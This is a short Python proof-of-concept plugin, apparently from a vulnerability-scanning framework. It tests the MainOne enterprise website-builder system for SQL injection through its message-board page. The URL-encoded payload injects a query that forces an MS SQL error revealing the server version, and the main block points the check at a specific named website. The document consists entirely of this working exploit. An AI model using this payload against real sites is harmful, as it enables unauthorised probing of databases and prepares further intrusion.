#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:铭万信息技术企事业通用建站系统SQL注入(系统不同)
#Refer:http://www.wooyun.org/bugs/wooyun-2010-074974

def assign(service,arg):
    if service=="mainone_b2b":
        return True,arg 
    
def  audit(arg):
    url=arg+"MessageBoard/Default.aspx?hidIsreply=DefaultModule1%24rbIsReply&DefaultModule1%24txtKey=%%27+and+(select%20char(64)%2B@@version)>0%20and%2B%27%%27=%27"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and "@Microsoft" in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('mainone_b2b','http://www.semi-chip.com/')[1])